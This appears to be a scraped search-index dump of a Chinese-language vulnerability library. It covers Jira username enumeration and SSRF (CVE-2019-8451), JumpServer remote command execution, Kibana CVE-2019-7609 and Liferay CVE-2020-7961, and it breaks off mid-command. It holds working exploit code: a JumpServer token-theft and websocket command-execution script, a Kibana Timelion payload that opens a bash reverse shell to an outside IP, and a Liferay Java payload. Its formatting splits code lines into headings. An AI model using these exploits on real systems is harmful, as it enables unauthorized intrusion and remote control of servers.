Jira\u7ec4\u4ef6\u4ecb\u7ecd","text":"<p>Jira\u662f\u4e00\u4e2a\u7f3a\u9677\u8ddf\u8e2a\u7ba1\u7406\u7cfb\u7edf\uff0c\u4e3a\u9488\u5bf9\u7f3a\u9677\u7ba1\u7406\u3001\u4efb\u52a1\u8ffd\u8e2a\u548c\u9879\u76ee\u7ba1\u7406\u7684\u5546\u4e1a\u6027\u5e94\u7528\u8f6f\u4ef6\uff0c\u5f00\u53d1\u8005\u662f\u6fb3\u5927\u5229\u4e9a\u7684Atlassian\u3002Jira \u7528 Java \u8bed\u8a00\u7f16\u5199\uff0c\u4f7f\u7528 Pico \u5bb9\u5668\uff0cApache OFBiz\uff0c\u4ee5\u53ca WebWork 1 technology stack\u3002Jira  \u652f\u6301 SOAP\uff0cXML-RPC \u4ee5\u53ca REST\u3002\u5176\u62e5\u6709\u7075\u6d3b\u7684\u63d2\u4ef6\u67b6\u6784\uff0c\u53ef\u4ee5\u8c03\u7528 JIRA \u5f00\u53d1\u8005\u793e\u533a\u548c\u7b2c\u4e09\u65b9\u5f00\u53d1\u7684\u63d2\u4ef6\uff0c\u914d\u5408Atlassian  IDE Connector\u53ef\u4ee5\u4e0e IDE \u96c6\u6210\uff0c\u6bd4\u5982 Eclipse\u548c IntelliJ IDEA\u3002Jira API\u5141\u8bb8\u5f00\u53d1\u8005\u5411 Jira  \u4e2d\u7ee7\u627f\u7b2c\u4e09\u65b9\u5f00\u53d1\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/Atlassian%20Jira%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#22","title":"2.2 \u6f0f\u6d1e\u63cf\u8ff0","text":"<p>Jira\u5b58\u5728\u4e00\u4e2a\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u672a\u6388\u6743\u7684\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e2aapi\u63a5\u53e3\u76f4\u63a5\u67e5\u8be2\u5230\u67d0\u7528\u6237\u540d\u7684\u5b58\u5728\u60c5\u51b5\uff0c\u8be5\u63a5\u53e3\u4e0d\u540c\u4e8eCVE-2019-8446\u548cCVE-2019-3403\u7684\u63a5\u53e3\uff0c\u662f\u4e00\u4e2a\u65b0\u7684\u63a5\u53e3\u3002\u5982\u679cJira\u66b4\u9732\u5728\u516c\u7f51\u4e2d\uff0c\u672a\u6388\u6743\u7528\u6237\u5c31\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u8be5\u63a5\u53e3\u7206\u7834\u51fa\u6f5c\u5728\u7684\u7528\u6237\u540d\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/Atlassian%20Jira%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#23","title":"2.3 \u6f0f\u6d1e\u590d\u73b0","text":"<p>\u642d\u5efaJira 7.13.0\u73af\u5883\uff0c\u6210\u529f\u590d\u73b0\u6f0f\u6d1e\u5982\u4e0b\uff1a</p> <p>\u7528\u6237\u4e0d\u5b58\u5728\u60c5\u51b5\u4e0b\uff1a</p> <p></p> <p>\u7528\u6237\u540d\u5b58\u5728\u60c5\u51b5\u4e0b\uff1a</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/Atlassian%20Jira%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_3","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>\u76ee\u524d\u53d7\u5f71\u54cd\u7684jira\u7248\u672c\uff1a</p> <ul> <li> <p>Jira &lt; 7.13.6</p> </li> <li> <p>Jira 8.0.0 - 8.5.7</p> </li> <li> <p>Jira 8.6.0 - 8.12.0</p> </li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/Atlassian%20Jira%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_4","title":"\u89e3\u51b3\u65b9\u6848","text":"<p>\u200b    </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/Atlassian%20Jira%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#41","title":"4.1 \u4fee\u590d\u5efa\u8bae","text":"<p>\u76ee\u524d\u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\u4fee\u590d\u6f0f\u6d1e\uff0c\u8bf7\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u8fdb\u884c\u5347\u7ea7\u52a0\u56fa\u3002\u8865\u4e01\u83b7\u53d6\u94fe\u63a5\uff1ahttps://www.atlassian.com/zh/software/jira/download</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/Atlassian%20Jira%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_5","title":"\u65f6\u95f4\u8f74","text":"<p>2020/09/16</p> <p>Jira\u5b98\u7f51\u516c\u5e03\u8be5\u6f0f\u6d1eissue</p> <p>2020/10/22</p> <p>\u6df1\u4fe1\u670d\u5343\u91cc\u76ee\u5b89\u5168\u5b9e\u9a8c\u5ba4\u5206\u6790\u590d\u73b0\u6f0f\u6d1e\u5e76\u53d1\u5e03\u6f0f\u6d1e\u5b89\u5168\u901a\u544a</p> <p>\u53c2\u8003\u94fe\u63a5</p> <p>\u200b    </p> <ul> <li> <p>https://www.atlassian.com/zh/software/jira/download</p> </li> <li> <p>https://jira.atlassian.com/browse/JRASERVER-71560?error=login_required&amp;error_description=Login+required&amp;state=8c84139f-b8f3-4d2c-a1c1-906c66ab2c90</p> </li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/CVE-2019-8451/","title":"CVE-2019-8451 Jira\u672a\u6388\u6743SSRF\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/CVE-2019-8451/#python-usage","title":"python usage","text":"<p>\u811a\u672cgithub\u83b7\u53d6</p> <p><code>python CVE-2019-8451.py  http://www.jas502n.com:8080</code></p> <p></p> <pre><code>root@kali:~/CVE-2019-8451# python CVE-2019-8451.py  http://www.jas502n.com:8080\n\n&gt;&gt;&gt;&gt;SSRF URL: www.baidu.com\n\n&gt;&gt;&gt;&gt;Send poc Success!\n\nX-AUSERNAME= anonymous\n\n&gt;&gt;&gt;&gt;vuln_url= http://www.jas502n.com:8080/plugins/servlet/gadgets/makeRequest?url=http://www.jas502n.com:8080@www.baidu.com\n\nthrow 1; &lt; don't be evil' &gt;{\"http://www.jas502n.com:8080@www.baidu.com\":{\"rc\":200,\"headers\":{\"set-cookie\":[\"BDORZ=27315; max-age=86400; domain=.baidu.com; path=/\"]},\"body\":\"&lt;!DOCTYPE html&gt;\\r\\n&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv=content-type content=text/html;charset=utf-8&gt;&lt;meta http-equiv=X-UA-Compatible content=IE=Edge&gt;&lt;meta content=always name=referrer&gt;&lt;link rel=stylesheet type=text/css href=http://s1.bdstatic.com/r/www/cache/bdorz/baidu.min.css&gt;&lt;title&gt;\u767e\u5ea6\u4e00\u4e0b\uff0c\u4f60\u5c31\u77e5\u9053&lt;\\/title&gt;&lt;\\/head&gt; &lt;body link=#0000cc&gt; &lt;div id=wrapper&gt; &lt;div id=head&gt; &lt;div class=head_wrapper&gt; &lt;div class=s_form&gt; &lt;div class=s_form_wrapper&gt; &lt;div id=lg&gt; &lt;img hidefocus=true src=//www.baidu.com/img/bd_logo1.png width=270 height=129&gt; &lt;\\/div&gt; &lt;form id=form name=f action=//www.baidu.com/s class=fm&gt; &lt;input type=hidden name=bdorz_come value=1&gt; &lt;input type=hidden name=ie value=utf-8&gt; &lt;input type=hidden name=f value=8&gt; &lt;input type=hidden name=rsv_bp value=1&gt; &lt;input type=hidden name=rsv_idx value=1&gt; &lt;input type=hidden name=tn value=baidu&gt;&lt;span class=\\\"bg s_ipt_wr\\\"&gt;&lt;input id=kw name=wd class=s_ipt value maxlength=255 autocomplete=off autofocus&gt;&lt;\\/span&gt;&lt;span class=\\\"bg s_btn_wr\\\"&gt;&lt;input type=submit id=su value=\u767e\u5ea6\u4e00\u4e0b class=\\\"bg s_btn\\\"&gt;&lt;\\/span&gt; &lt;\\/form&gt; &lt;\\/div&gt; &lt;\\/div&gt; &lt;div id=u1&gt; &lt;a href=http://news.baidu.com name=tj_trnews class=mnav&gt;\u65b0\u95fb&lt;\\/a&gt; &lt;a href=http://www.hao123.com name=tj_trhao123 class=mnav&gt;hao123&lt;\\/a&gt; &lt;a href=http://map.baidu.com name=tj_trmap class=mnav&gt;\u5730\u56fe&lt;\\/a&gt; &lt;a href=http://v.baidu.com name=tj_trvideo class=mnav&gt;\u89c6\u9891&lt;\\/a&gt; &lt;a href=http://tieba.baidu.com name=tj_trtieba class=mnav&gt;\u8d34\u5427&lt;\\/a&gt; &lt;noscript&gt; &lt;a href=http://www.baidu.com/bdorz/login.gif?login&amp;amp;tpl=mn&amp;amp;u=http%3A%2F%2Fwww.baidu.com%2f%3fbdorz_come%3d1 name=tj_login class=lb&gt;\u767b\u5f55&lt;\\/a&gt; &lt;\\/noscript&gt; &lt;script&gt;document.write('&lt;a href=\\\"http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u='+ encodeURIComponent(window.location.href+ (window.location.search === \\\"\\\" ? \\\"?\\\" : \\\"&amp;\\\")+ \\\"bdorz_come=1\\\")+ '\\\" name=\\\"tj_login\\\" class=\\\"lb\\\"&gt;\u767b\u5f55&lt;\\/a&gt;');&lt;\\/script&gt; &lt;a href=//www.baidu.com/more/ name=tj_briicon class=bri style=\\\"display: block;\\\"&gt;\u66f4\u591a\u4ea7\u54c1&lt;\\/a&gt; &lt;\\/div&gt; &lt;\\/div&gt; &lt;\\/div&gt; &lt;div id=ftCon&gt; &lt;div id=ftConw&gt; &lt;p id=lh&gt; &lt;a href=http://home.baidu.com&gt;\u5173\u4e8e\u767e\u5ea6&lt;\\/a&gt; &lt;a href=http://ir.baidu.com&gt;About Baidu&lt;\\/a&gt; &lt;\\/p&gt; &lt;p id=cp&gt;&amp;copy;2017&amp;nbsp;Baidu&amp;nbsp;&lt;a href=http://www.baidu.com/duty/&gt;\u4f7f\u7528\u767e\u5ea6\u524d\u5fc5\u8bfb&lt;\\/a&gt;&amp;nbsp; &lt;a href=http://jianyi.baidu.com/ class=cp-feedback&gt;\u610f\u89c1\u53cd\u9988&lt;\\/a&gt;&amp;nbsp;\u4eacICP\u8bc1030173\u53f7&amp;nbsp; &lt;img src=//www.baidu.com/img/gs.gif&gt; &lt;\\/p&gt; &lt;\\/div&gt; &lt;\\/div&gt; &lt;\\/div&gt; &lt;\\/body&gt; &lt;\\/html&gt;\\r\\n\"}}\n\n&gt;&gt;&gt;&gt;SSRF URL:\n</code></pre> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/CVE-2019-8451/#0x01-ssrf-in-the-pluginsservletgadgetsmakerequest-resource-cve-2019-8451","title":"0x01 SSRF in the /plugins/servlet/gadgets/makeRequest resource - CVE-2019-8451","text":"<pre><code>The /plugins/servlet/gadgets/makeRequest resource in Jira before version 8.4.0 allows remote attackers to access the content of internal network resources via a Server Side Request Forgery (SSRF) vulnerability due to a logic bug in the JiraWhitelist class.\n\nFixed in Version/s: 8.4.0\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/CVE-2019-8451/#_1","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://mp.weixin.qq.com/s/_Tsq9p1pQyszJt2VaXd61A</p> <p>https://jira.atlassian.com/browse/JRASERVER-69793</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/CVE-2019-8451/#_2","title":"\u6765\u6e90","text":"<p>https://github.com/jas502n/CVE-2019-8451</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"-- coding: utf-8 --","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#import-requests","title":"import requests","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#import-json","title":"import json","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#datauser4320ce47-e0e0-4b86-adb1-675ca611ea0cassetccb9c6d7-6221-445e-9fcc-b30c95162825system_user79655e4e-1741-46af-a793-fff394540a52","title":"data={\"user\":\"4320ce47-e0e0-4b86-adb1-675ca611ea0c\",\"asset\":\"ccb9c6d7-6221-445e-9fcc-b30c95162825\",\"system_user\":\"79655e4e-1741-46af-a793-fff394540a52\"}","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_1","title":"-- coding: utf-8 --","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#url_hosthttp1921681738080","title":"url_host='http://192.168.1.73:8080'","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_2","title":"-- coding: utf-8 --","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#def-get_token","title":"def get_token():","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#url-url_hostapiv1usersconnection-tokenuser-only1","title":"url = url_host+'/api/v1/users/connection-token/?user-only=1'","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#url-url_hostapiv1authenticationconnection-tokenuser-only1","title":"url =url_host+'/api/v1/authentication/connection-token/?user-only=1'","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#response-requestsposturl-jsondatajson","title":"response = requests.post(url, json=data).json()","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#printresponse","title":"print(response)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#retrequestsgeturl_hostapiv1authenticationconnection-tokentokensresponsetoken","title":"ret=requests.get(url_host+'/api/v1/authentication/connection-token/?token=%s'%response['token'])","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#printrettext","title":"print(ret.text)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#get_token","title":"get_token()","text":"<p>import asyncio</p> <p>import websockets</p> <p>import requests</p> <p>import json</p> <p>url = \"/api/v1/authentication/connection-token/?user-only=None\"</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_3","title":"\u5411\u670d\u52a1\u5668\u7aef\u53d1\u9001\u8ba4\u8bc1\u540e\u7684\u6d88\u606f","text":"<p>async def send_msg(websocket,_text):</p> <p>if _text == \"exit\":</p> <p>print(f'you have enter \"exit\", goodbye')</p> <p>await websocket.close(reason=\"user exit\")</p> <p>return False</p> <p>await websocket.send(_text)</p> <p>recv_text = await websocket.recv()</p> <p>print(f\"{recv_text}\")</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/JunmpServer/JumpServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_4","title":"\u5ba2\u6237\u7aef\u4e3b\u903b\u8f91","text":"<p>async def main_logic(cmd):</p> <p>print(\"#######start ws\")</p> <p>async with websockets.connect(target) as websocket:</p> <p>recv_text = await websocket.recv()</p> <p>print(f\"{recv_text}\")</p> <p>resws=json.loads(recv_text)</p> <p>id = resws['id']</p> <p>print(\"get ws id:\"+id)</p> <p>print(\"###############\")</p> <p>print(\"init ws\")</p> <p>print(\"###############\")</p> <p>inittext = json.dumps({\"id\": id, \"type\": \"TERMINAL_INIT\", \"data\": \"{\\\"cols\\\":164,\\\"rows\\\":17}\"})</p> <p>await send_msg(websocket,inittext)</p> <p>for i in range(20):</p> <p>recv_text = await websocket.recv()</p> <p>print(f\"{recv_text}\")</p> <p>print(\"###############\")</p> <p>print(\"exec cmd: ls\")</p> <p>cmdtext = json.dumps({\"id\": id, \"type\": \"TERMINAL_DATA\", \"data\": cmd+\"\\r\\n\"})</p> <p>print(cmdtext)</p> <p>await send_msg(websocket, cmdtext)</p> <p>for i in range(20):</p> <p>recv_text = await websocket.recv()</p> <p>print(f\"{recv_text}\")</p> <p>print('#######finish')</p> <p>if name == 'main':</p> <p>try:</p> <p>import sys</p> <p>host=sys.argv[1]</p> <p>cmd=sys.argv[2]</p> <p>if host[-1]=='/':</p> <p>host=host[:-1]</p> <p>print(host)</p> <p>data = {\"user\": \"4320ce47-e0e0-4b86-adb1-675ca611ea0c\", \"asset\": \"ccb9c6d7-6221-445e-9fcc-b30c95162825\",</p> <p>\"system_user\": \"79655e4e-1741-46af-a793-fff394540a52\"}</p> <p>print(\"##################\")</p> <p>print(\"get token url:%s\" % (host + url,))</p> <p>print(\"##################\")</p> <p>res = requests.post(host + url, json=data)</p> <p>token = res.json()[\"token\"]</p> <p>print(\"token:%s\", (token,))</p> <p>print(\"##################\")</p> <p>target = \"ws://\" + host.replace(\"http://\", '') + \"/koko/ws/token/?target_id=\" + token</p> <p>print(\"target ws:%s\" % (target,))</p> <p>asyncio.get_event_loop().run_until_complete(main_logic(cmd))</p> <p>except:</p> <p>print(\"python jumpserver.py http://192.168.1.73 whoami\")</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Kibana/CVE-2019-7609-kibana%E4%BD%8E%E4%BA%8E6.6.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"CVE 2019 7609 kibana\u4f4e\u4e8e6.6.0\u672a\u6388\u6743\u8fdc\u7a0b\u4ee3\u7801\u547d\u4ee4\u6267\u884c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Kibana/CVE-2019-7609-kibana%E4%BD%8E%E4%BA%8E6.6.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#cve-2019-7609-kibana660","title":"CVE-2019-7609-kibana&lt;6.6.0\u672a\u6388\u6743\u8fdc\u7a0b\u4ee3\u7801\u547d\u4ee4\u6267\u884c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Kibana/CVE-2019-7609-kibana%E4%BD%8E%E4%BA%8E6.6.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#poc","title":"POC","text":"<p>\u5c06POC\u91cc\u7684\u53cd\u94feIP\u5730\u5740\u6362\u6210\u81ea\u5df1\u7684\uff0c\u7136\u540e\u5728\u76ee\u6807\u673a\u5668\u4e0a\u7684 <code>Timelion</code> \u9009\u9879\u4e0b\u5c06\u4ee5\u4e0b <code>POC</code> \u7c98\u8d34\u8fdb\u53bb\uff0c\u7136\u540e\u70b9\u51fb <code>Run</code> \u8fd0\u884c\uff1a  </p> <pre><code>.es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -i &gt;&amp; /dev/tcp/10.10.20.166/8989 0&gt;&amp;1\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')\n</code></pre> <p>\u7136\u540e\u81ea\u5df1\u673a\u5668\u5f00\u542f\u76d1\u542c\uff0c\u518d\u70b9\u51fb <code>Canvas</code> \u5373\u53ef\u51fa\u53d1\u6f0f\u6d1e\u3002  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Liferay%20Portal/Liferay%20Portal%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"Liferay Portal\u4ee3\u7801\u6267\u884c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Liferay%20Portal/Liferay%20Portal%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#cve-2020-7961-liferay-portal","title":"CVE-2020-7961 Liferay Portal \u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u539f\u521b shadow1ng [\u96f7\u795e\u4f17\u6d4b]</p> <p>\u58f0\u660e</p> <p>\u7531\u4e8e\u4f20\u64ad\u3001\u5229\u7528\u6b64\u6587\u6240\u63d0\u4f9b\u7684\u4fe1\u606f\u800c\u9020\u6210\u7684\u4efb\u4f55\u76f4\u63a5\u6216\u8005\u95f4\u63a5\u7684\u540e\u679c\u53ca\u635f\u5931\uff0c\u5747\u7531\u4f7f\u7528\u8005\u672c\u4eba\u8d1f\u8d23\uff0c\u96f7\u795e\u4f17\u6d4b\u4ee5\u53ca\u6587\u7ae0\u4f5c\u8005\u4e0d\u4e3a\u6b64\u627f\u62c5\u4efb\u4f55\u8d23\u4efb\u3002</p> <p>\u96f7\u795e\u4f17\u6d4b\u62e5\u6709\u5bf9\u6b64\u6587\u7ae0\u7684\u4fee\u6539\u548c\u89e3\u91ca\u6743\u3002\u5982\u6b32\u8f6c\u8f7d\u6216\u4f20\u64ad\u6b64\u6587\u7ae0\uff0c\u5fc5\u987b\u4fdd\u8bc1\u6b64\u6587\u7ae0\u7684\u5b8c\u6574\u6027\uff0c\u5305\u62ec\u7248\u6743\u58f0\u660e\u7b49\u5168\u90e8\u5185\u5bb9\u3002\u672a\u7ecf\u96f7\u795e\u4f17\u6d4b\u5141\u8bb8\uff0c\u4e0d\u5f97\u4efb\u610f\u4fee\u6539\u6216\u8005\u589e\u51cf\u6b64\u6587\u7ae0\u5185\u5bb9\uff0c\u4e0d\u5f97\u4ee5\u4efb\u4f55\u65b9\u5f0f\u5c06\u5176\u7528\u4e8e\u5546\u4e1a\u76ee\u7684\u3002</p> <p>\u6f0f\u6d1e\u63cf\u8ff0</p> <p>\u8fd1\u65e5,Code White\u516c\u5f00\u4e86\u5728Liferay Portal\u4e2d\u53d1\u73b0\u7684JSON\u53cd\u5e8f\u5217\u5316\u9ad8\u5371\u6f0f\u6d1e,\u672a\u6388\u6743\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610f\u6570\u636e\u5bf9API\u63a5\u53e3\u53d1\u8d77\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u653b\u51fb.</p> <p>Liferay\u662f\u4e00\u4e2a\u5f00\u6e90\u7684Portal\u4ea7\u54c1,\u63d0\u4f9b\u5bf9\u591a\u4e2a\u72ec\u7acb\u7cfb\u7edf\u7684\u5185\u5bb9\u96c6\u6210,\u4e3a\u4f01\u4e1a\u4fe1\u606f\u3001\u6d41\u7a0b\u7b49\u7684\u6574\u5408\u63d0\u4f9b\u4e86\u4e00\u5957\u5b8c\u6574\u7684\u89e3\u51b3\u65b9\u6848,\u548c\u5176\u4ed6\u5546\u4e1a\u4ea7\u54c1\u76f8\u6bd4,Liferay\u6709\u7740\u5f88\u591a\u4f18\u826f\u7684\u7279\u6027,\u800c\u4e14\u514d\u8d39,\u5728\u5168\u7403\u90fd\u6709\u8f83\u591a\u7528\u6237\u3002</p> <p>No.1</p> <p>\u590d\u73b0\u8fc7\u7a0b</p> <p>\u4e00.\u73af\u5883\u642d\u5efa</p> <p>\u672c\u6b21\u4f7f\u7528\u73af\u5883</p> <p>windows 10</p> <p>jdk-8u251</p> <p>jre-8u251</p> <p>\u4e0b\u8f7dtomcat\u96c6\u6210\u5305liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.tar.gz</p> <p>\u4e8c.\u914d\u7f6e\u73af\u5883</p> <p>\u8bbe\u7f6ejre\u8def\u5f84,\u7f16\u8f91</p> <p>C:\\Users\\\u5f71\u821e\u8005\\Desktop\\liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761\\liferay-portal-7.2.0-ga1\\tomcat-9.0.17\\bin\\setclasspath.bat</p> <p>\u6dfb\u52a0set JRE_HOME=C:\\Program Files\\Java\\jre1.8.0_251</p> <p></p> <p>\u4e09.\u5f00\u542f\u73af\u5883</p> <pre><code>cd C:\\Users\\\u5f71\u821e\u8005\\Desktop\\liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761\\liferay-portal-7.2.0-ga1\\tomcat-9.0.17\\bin.\\catalina.bat run\n1\n</code></pre> <p></p> <p>\u5f00\u542f\u540e\uff0c\u8bbf\u95eehttp://127.0.0.1:8080\uff0c\u70b9\u51fb\u9ed8\u8ba4\u914d\u7f6e\u5373\u53ef</p> <p></p> <p>\u56db. expoilt</p> <p>1.\u7f16\u8bd1LifExp.java \u2192LifExp.class</p> <pre><code>javac .\\LifExp.java\n1\n</code></pre> <p>LifExp.java</p> <pre><code>public class LifExp { \n    static { \n        try { \n            String[] cmd = {\"cmd.exe\", \"/c\", \"calc.exe\"};\n            java.lang.Runtime.getRuntime().\nexec(cmd).waitFor(); \n        } catch ( Exception e ) { \n            e.printStackTrace(); \n        } \n    } \n}\n1234567891011\n</code></pre> <p>2.\u751f\u6210payload</p> <pre><code>java -cp 